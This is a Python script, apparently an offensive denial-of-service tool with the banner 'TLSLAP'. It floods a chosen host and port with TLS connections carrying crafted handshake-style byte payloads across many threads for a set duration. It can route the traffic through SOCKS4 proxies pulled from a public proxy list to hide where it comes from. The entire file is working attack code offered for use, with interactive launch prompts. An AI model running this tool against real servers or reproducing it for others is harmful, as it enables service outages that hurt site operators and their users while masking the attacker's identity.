#!/usr/bin/env python3

import os, sys, time, threading
import socket, random, string, ssl, warnings
import requests, socks
from urllib.parse import urlparse

_proxies = []
_abort = threading.Event()

def _worker1(_ip, _prt, _ver): # not proxified
    global _abort
    warnings.filterwarnings("ignore", category=DeprecationWarning)    
    
    payload = ''
    
    if _ver == '1.3':
        payload = '\x16\x03\x04{}\x00\x00\x02\xc0\x2c\xc0\x30\x01\x00'
    else:
        # default to the still commonly-used TLSv1.2
        payload = '\x16\x03\x03{}\x00\x00\x02\xc0\x2c\xc0\x30\x01\x00'
    
    while not _abort.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((_ip, int(_prt)))
            ssl_sock = ssl.wrap_socket(s)
            ssl_sock.send(payload.format('\x4d\x6f\x92\xc9').encode())
            
            while not _abort.is_set():
                print('\033[1m\033[32mTLS abuse @ ' + _ip + ':' + str(_prt) + ' sent!')
                _hex = [format(random.randint(0, 255), '02x') for _ in range(4)]
                _junk = ''.join("\\x" + digit for digit in _hex)
                ssl_sock.send(payload.format(_junk).encode())

            ssl_sock.close()
            s.close()
        except:
            print('\033[1m\033[31mRejected by endpoint!')

def _worker2(_ip, _prt, _ver, _reqs): # proxified
    global _abort, _proxies
    warnings.filterwarnings("ignore", category=DeprecationWarning)    
    
    payload = ''
    
    if _ver == '1.3':
        payload = '\x16\x03\x04{}\x00\x00\x02\xc0\x2c\xc0\x30\x01\x00'
    else:
        # default to the still commonly-used TLSv1.2
        payload = '\x16\x03\x03{}\x00\x00\x02\xc0\x2c\xc0\x30\x01\x00'
        
    while not _abort.is_set():
        try:
            proxy = random.choice(_proxies)
            _pip, _pprt = proxy.split(":")
            
            _count = 0
            
            s = socks.socksocket()
            s.settimeout(2)
            s.set_proxy(socks.SOCKS4, _pip, int(_pprt))
            s.connect((_ip, int(_prt)))
            
            ssl_sock = ssl.wrap_socket(s)
            ssl_sock.send(payload.format('\x4d\x6f\x92\xc9').encode())
            while not (_count == _reqs or _abort.is_set()):
                print('\033[1m\033[32mTLS abuse @ ' + _ip + ':' + str(_prt) + ' sent via proxy ---> ' + proxy)
                _hex = [format(random.randint(0, 255), '02x') for _ in range(4)]
                _junk = ''.join("\\x" + digit for digit in _hex)
                ssl_sock.send(payload.format(_junk).encode())
                _count +=1

            ssl_sock.close()
            s.close()
        except (socket.error, ConnectionRefusedError):
            print('\033[1m\033[31mProxy ' + proxy + ' rejected request!')
            _count = 0

def _loadprox():     
    global _proxies
    _api ='https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=1000&country=all&ssl=yes&anonymity=all'

    try:
        req = requests.get(_api)
        
        if req.status_code == 200:
            _content = req.content.decode().splitlines()
            for line in _content:
                _proxies.append(line)

        else:
            sys.exit('\r\n\033[1m\033[31mAPI error! Exiting...')
    except:
        pass
        
    print('\r\n\033[1m\033[36mTotal of ' + str(len(_proxies)) + ' proxies ready!\r\n')

def _rslv(host):
    host = host.lower()
    if not (host.startswith('http://') or host.startswith('https://')):
        host = "http://" + host
    try:
        _hname = urlparse(host).netloc
        _ip = socket.gethostbyname(_hname)
        return _ip
    except Exception as e:
        sys.exit('\r\n\033[1m\033[31mDNS resolution error! Exiting...')

def main():
    global _abort
    os.system('clear')
    
    print('''\033[1m\033[31m
 dMMMMMMP dMP    .dMMMb  dMP     .aMMMb  dMMMMb
   dMP   dMP    dMP  VP dMP     dMP dMP dMP dMP
  dMP   dMP     VMMMb  dMP     dMMMMMP dMMMMP"
 dMP   dMP    dP  dMP dMP     dMP dMP dMP
dMP   dMMMMMP VMMMP" dMMMMMP dMP dMP dMP
''')
    try:
        site = input('\033[37mDomain/URL:\033[32m ')
        _ip = _rslv(site)  # DNS Resolution
        
        _prt = int(input('\033[37mPort (default 443):\033[32m '))
        
        _ver = input('\033[37mTLS version (1.2 or 1.3):\033[32m ')
        if not (_ver == '1.2' or _ver == '1.3'):
            _ver = '1.2'  # more sites still statistically use 1.2
        
        _reqs = 0
        _prox = input('\033[37mUse proxies? Y/n:\033[32m ')
        if _prox.lower() == 'y':
            _reqs = int(input('\033[37m# of requests per proxy:\033[32m '))
            _loadprox()
        
        _time = int(input('\033[37mDuration (sec):\033[32m '))
        
        _thdz = int(input('\033[37mThreads (default 5):\033[32m '))
        
        input('\r\n\033[31mReady? Strike <ENTER> to launch and <CTRL+C> to abort...\r\n')
        
    except KeyboardInterrupt:
        sys.exit('\r\n\r\n\033[31mAborted!\r\n')
    except:
        main()
    
    tasks = []
    
    for _ in range(_thdz):
        if _prox.lower() == 'n':
            x = threading.Thread(target=_worker1, args=(_ip, _prt, _ver))
        else:
            x = threading.Thread(target=_worker2, args=(_ip, _prt, _ver, _reqs))
        
        x.daemon = True
        tasks.append(x)
        x.start()
    
    _quit = time.time() + _time
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
    
    _abort.set()
    
    for y in tasks:
        y.join()
    
    sys.exit('\r\n\033[37mDone.\r\n')

if __name__ == '__main__':
    main()
